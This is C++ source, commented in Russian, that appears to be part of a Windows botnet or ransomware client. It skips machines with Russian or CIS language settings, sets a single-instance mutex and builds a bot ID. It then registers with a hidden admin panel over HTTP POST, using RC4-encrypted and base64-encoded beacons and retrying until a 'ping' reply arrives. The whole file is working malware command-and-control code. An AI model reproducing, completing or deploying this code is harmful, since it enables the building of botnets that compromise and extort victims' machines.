#include <Windows.h>
#include <wbemidl.h>
#include <ctime>
#include <comutil.h>
#include <stdint.h>

#include "Debug_to_file.h"
#include "Crypt.h"
#include "Core/Common.h"
#include "Core/core.h"
#include "MemLimits.h"

static BYTE  serverResponse[MEM_LIMIT];
static BYTE  DecResponse[MEM_LIMIT];

static uint8_t ascii[1024*sizeof(wchar_t)];
static wchar_t unicode[1024];
static wchar_t  PostStr[1024];


//Создание случайной строки
static bool is_start_random = false;
static void gen_random(uint8_t* s, const int len) {
	if (is_start_random == false) {
		srand(time(0)); //Для автоматической рандомизации
		is_start_random = true;
	}
	static const uint8_t alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	for (int i = 0; i < len; ++i) {
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	s[len] = 0;
}

static void* my_memcpy(void* to, const void* from, size_t n)
{
	const char* f_pointer = (const char*)from;
	char* t_pointer = (char*)to;
	for (size_t i = 0; i < n; ++i)
	{
		*(t_pointer++) = *(f_pointer++);
	}
	return to;
}

//Старт бота, проверка условий запуска, установка мьютекса и формирование айди бота
void start_bot(wchar_t* botId) {

	//Проверка локализации, по РУ и СНГ неработаем.)))
	clear_log();
	int result = (int)GetUserDefaultLangID();
	if ((result == 1049) || // рф
		(result == 106) || // армения
		(result == 1059) || // беларусь
		(result == 1079) || // грузия
		(result == 1087) || // казахстан
		(result == 1064) || // таджикистан
		(result == 2115) || // узбекистан
		(result == 1058))   // украина
	{
		DEBUG_TO_FILE("+++ Localization unsupported \r\n");
		//TODO Самоудалится...
		//do_destroy()
	}

	//Получаем айди бота
	GetBotId(botId);

	//Создаем мьютекс, если он есть, то выходим
	HANDLE botMutex = NULL;
	botMutex = API(KERNEL32, CreateMutexW)(NULL, TRUE, botId);
	if (API(KERNEL32, GetLastError)() == ERROR_ALREADY_EXISTS)
	{
		DEBUG_TO_FILE("+++ Bot ID:%d is already started:%x \r\n", botId);
		ExitProcess(0);
	}

	return;
}

//Генерация строки для отправки по алгоритму
uint8_t* gen_data_to_send(uint8_t* to_enc_data, uint32_t size_enc_data) {

	//Генерация ключа для шифрования трафика
	uint8_t key_for_crypt[32];
	gen_random(key_for_crypt, 32);

	//Подготовка данных для отправки
	uint8_t* enc_data = NULL;
	enc_data = (uint8_t*)malloc(size_enc_data + 1);
	if (enc_data == NULL) {
		DEBUG_TO_FILE("+++ data_to_send is NULL \r\n");
		return NULL;
	}

	my_memcpy(enc_data, to_enc_data, size_enc_data);

	//Шифрование botId
	encRC4(key_for_crypt, 32, (uint8_t*)enc_data, size_enc_data);

	//Упаковка данных в BASE64
	uint8_t* data_to_base64 = NULL;
	data_to_base64 = base64_encode(enc_data);
	if (data_to_base64 == NULL) {
		DEBUG_TO_FILE("+++ data_to_send is NULL \r\n");
		return NULL;
	}

	//Формирование итоговых данных для отправки
	uint32_t size_data = 32 + strlen((const char*)data_to_base64) + 1;
	uint8_t* data_to_send = NULL;
	data_to_send = (uint8_t*)malloc(size_data);
	if (data_to_send == NULL) {
		DEBUG_TO_FILE("+++ data_to_send is NULL \r\n");
		return NULL;
	}

	//Копирование ключа в начало строки
	my_memcpy(data_to_send, key_for_crypt, 32);

	//Копирование шифрованной строки
	int size_base64_data = strlen((const char*)(data_to_base64)) + 1;
	my_memcpy(data_to_send + 32, data_to_base64, size_base64_data);

	//Освобождение памяти
	free(data_to_base64);
	free(enc_data);

	return data_to_send;
}

//Расшифровка принятых данных по алгоритму
bool decrypt_recv_data(uint8_t* enc_data, uint32_t size_enc_data, uint8_t* dec_data) {

	uint8_t* data_to_base64 = NULL;

	DEBUG_TO_FILE("+++ ENC_RECV_DATA:%s \r\n", enc_data);

	data_to_base64 = base64_decode(enc_data + 32);
	if (data_to_base64 == NULL) {
		DEBUG_TO_FILE("+++ data_to_send is NULL \r\n");
		return false;
	}

	//Расшифровка
	decRC4(enc_data, 32, (uint8_t*)data_to_base64, size_enc_data);
	my_memcpy(dec_data, data_to_base64, size_enc_data);

	DEBUG_TO_FILE("+++ DEC_RECV_DATA:%s \r\n", dec_data);

	//Освобождение памяти
	free(data_to_base64);

	return true;
}

bool post_send_recv_bot(wchar_t* admin_addr,
	wchar_t* path_to_admin,
	wchar_t* post_recv,
	BYTE* decServerResponse) {

	DWORD serverResponseSize = 0;
	DWORD ret_code = (-1);
	uint8_t* data_to_send = NULL;

	UnicodeToASCII(post_recv, (char*)ascii);

	uint32_t size_data = strlen((const char*)ascii) + 1;

	data_to_send = gen_data_to_send(ascii, size_data);
	if (data_to_send == NULL) {
		DEBUG_TO_FILE("+++ data_to_send is NULL \r\n");
		ExitProcess(0);
	}

	ASCIIToUnicode((char*)data_to_send, unicode);

	//Посылка запроса в админку на регистрацию бота
	wsprintf(PostStr, L"tes=1&data=%s", unicode);

	ret_code = PostRequest(admin_addr, 0, path_to_admin, PostStr, &serverResponseSize, serverResponse);
	//Расшифровка ответа
	if ((ret_code == 0) && (serverResponseSize != 0)) {
		decrypt_recv_data(serverResponse, serverResponseSize - 32, decServerResponse);
		free(data_to_send);
		return true;
	}
	else {
		//DEBUG_TO_FILE("+++ Bad or null data from admin: ret_code = %d serverResponseSize = %d \r\n", ret_code, serverResponseSize);
		free(data_to_send);
		return false;
	}
}

//Регистрация бота в админке
//Попытка регистрации (Отправка запроса и ожидание прихода ping), 100 итераций, иначе ошибка и выход из программы
bool bot_reg(wchar_t *req) {
	bool ret_code = false;
	int count = 0;
	char* recv_code = NULL;
	for (count = 0; count < 100; count++) {
		ret_code = post_send_recv_bot(hide_admin_path(),
			hide_reg_path(),
			(wchar_t*)req,
			DecResponse);
		if (ret_code == true) {
			recv_code = strtok((char*)DecResponse, "|");
			if (recv_code != NULL) {
				//Проверяем пришел-ли ответ ping
				if (!strcmp(recv_code, hide_str_ping())) {
					break;
				}
			}
		}
		//Задержка секунду.
		Sleep(1000);
	}

	if (count < 100) {
		//Регистрация прошла
		return true;
	}
	else {
		//Регистрация не прошла.
		return false;
	}
}